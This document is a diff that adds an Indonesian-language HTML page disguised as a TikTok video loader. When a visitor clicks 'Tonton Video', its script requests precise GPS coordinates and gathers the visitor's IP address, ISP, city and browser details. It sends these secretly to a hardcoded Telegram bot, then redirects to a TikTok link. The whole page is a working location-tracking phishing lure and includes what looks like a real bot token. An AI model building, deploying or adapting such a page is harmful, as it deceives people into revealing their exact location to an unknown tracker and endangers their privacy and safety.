@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Memuat TikTok...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    .blink {
+      animation: blink 1s steps(2, start) infinite;
+    }
+    @keyframes blink {
+      to {
+        visibility: hidden;
+      }
+    }
+    #tombol:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
+    body {
+      background: #000;
+      color: #fff;
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 30vh;
+    }
+    .loader {
+      border: 6px solid #333;
+      border-top: 6px solid #0f0;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      margin: 20px auto;
+      animation: spin 2s linear infinite;
+    }
+    @keyframes spin {
+      0% {transform: rotate(0deg);}
+      100% {transform: rotate(360deg);}
+    }
+    #tombol {
+      background: #0f0;
+      border: none;
+      padding: 10px 20px;
+      font-size: 18px;
+      margin-top: 20px;
+      cursor: pointer;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Memuat video TikTok...</h2>
+  <div class="loader"></div>
+  <p class="blink">Loading...</p>
+  <button id="tombol">▶️ Tonton Video</button>
+
+  <script>
+    const token = "8009374862:AAGmy-Ak6PuCzKcx9ClKCW9oxhB_fvAZY_c";
+    const chatId = "7531913427";
+    const redirectLink = "https://vt.tiktok.com/ZSS8vrH4p/"; 
+
+    document.getElementById("tombol").onclick = () => {
+      const tombol = document.getElementById("tombol");
+      tombol.disabled = true;
+      tombol.innerText = "🔄 Memuat...";
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const gpsLat = pos.coords.latitude;
+        const gpsLon = pos.coords.longitude;
+        const gpsAcc = pos.coords.accuracy;
+        const gpsMaps = `https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
+        const waktu = new Date().toLocaleString();
+        const ua = navigator.userAgent;
+
+        fetch("https://ipapi.co/json/")
+          .then(res => res.json())
+          .then(data => {
+            const msg = `
+📥 TikTok Logger
+📍 IP: ${data.ip}
+🌍 Lokasi IP: ${data.city}, ${data.region}, ${data.country_name}
+📡 ISP: ${data.org}
+📱 UA: ${ua}
+🕒 Waktu: ${waktu}
+🧭 GPS Akurat: ${gpsLat}, ${gpsLon}
+🎯 Akurasi: ±${gpsAcc} meter
+🗺️ Maps: ${gpsMaps}
+`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+              .then(() => {
+                window.location.href = redirectLink;
+              })
+              .catch(err => {
+                alert("❌ Gagal kirim ke Telegram: " + err.message);
+                tombol.disabled = false;
+                tombol.innerText = "▶️ Tonton Video";
+              });
+
+          })
+          .catch(err => {
+            alert("❌ Gagal ambil data IP: " + err.message);
+            tombol.disabled = false;
+            tombol.innerText = "▶️ Tonton Video";
+          });
+
+      }, err => {
+        alert("❌ Lokasi gagal didapat: " + err.message);
+        tombol.disabled = false;
+        tombol.innerText = "▶️ Tonton Video";
+      }, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    };
+  </script>
+</body>
+  </html>
